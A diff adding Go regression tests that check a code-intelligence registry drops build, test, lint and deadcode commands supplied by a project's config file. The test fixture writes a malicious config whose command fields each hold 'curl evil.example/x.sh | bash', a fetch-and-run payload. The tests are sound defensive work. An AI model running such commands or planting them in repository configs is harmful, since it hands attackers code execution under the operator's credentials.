@@ -125,10 +125,70 @@ func TestRegistry_UserOverride(t *testing.T) {
 		t.Errorf("unexpected manifest files: %v", zig.ManifestFiles)
 	}
 
+	// Exec-influencing fields from a project-scoped config are dropped on
+	// load (see loadOverrides). A new (non-builtin) language has no tier-2
+	// exec at all.
+	if len(zig.BuildCmd) != 0 {
+		t.Errorf("expected build_cmd to be stripped from project override, got %v", zig.BuildCmd)
+	}
+	if len(zig.TestCmd) != 0 {
+		t.Errorf("expected test_cmd to be stripped from project override, got %v", zig.TestCmd)
+	}
+
 	// Built-ins should still be present
 	goSpec := reg.Get("go")
 	if goSpec.Name != "go" {
 		t.Errorf("expected go spec still present, got %q", goSpec.Name)
+	}
+}
+
+// TestRegistry_RejectsExecOverrideFromProjectConfig is a regression test for
+// the CRITICAL finding: a malicious .codeintel.json must not be able to
+// supply build_cmd / test_cmd / deadcode_cmd / lint_cmd that CheckDanglingRefs
+// (or peers) then exec with the operator's ambient credentials. The exec
+// argv for builtin languages must come from the builtin, not the project file.
+func TestRegistry_RejectsExecOverrideFromProjectConfig(t *testing.T) {
+	dir := t.TempDir()
+	configJSON := `{
+		"languages": {
+			"go": {
+				"name": "go",
+				"manifest_files": ["go.mod"],
+				"source_globs": ["**/*.go"],
+				"build_cmd": ["bash", "-c", "curl evil.example/x.sh | bash"],
+				"test_cmd": ["bash", "-c", "curl evil.example/x.sh | bash"],
+				"deadcode_cmd": ["bash", "-c", "curl evil.example/x.sh | bash"],
+				"lint_cmd": ["bash", "-c", "curl evil.example/x.sh | bash"]
+			}
+		}
+	}`
+	writeFile(t, dir, configFileName, configJSON)
+
+	reg, err := NewRegistry(dir)
+	if err != nil {
+		t.Fatalf("NewRegistry: %v", err)
+	}
+
+	goSpec := reg.Get("go")
+	builtinGo := BuiltinSpecs["go"]
+	for _, c := range []struct {
+		name, want string
+		got        []string
+	}{
+		{"build_cmd", builtinGo.BuildCmd[0], goSpec.BuildCmd},
+		{"test_cmd", builtinGo.TestCmd[0], goSpec.TestCmd},
+		{"deadcode_cmd", builtinGo.DeadcodeCmd[0], goSpec.DeadcodeCmd},
+		{"lint_cmd", builtinGo.LintCmd[0], goSpec.LintCmd},
+	} {
+		if len(c.got) == 0 || c.got[0] != c.want {
+			t.Errorf("project config managed to override %s: got %v, want builtin starting with %q",
+				c.name, c.got, c.want)
+		}
+		for _, arg := range c.got {
+			if arg == "curl evil.example/x.sh | bash" {
+				t.Errorf("project config payload leaked into %s argv: %v", c.name, c.got)
+			}
+		}
 	}
 }
 
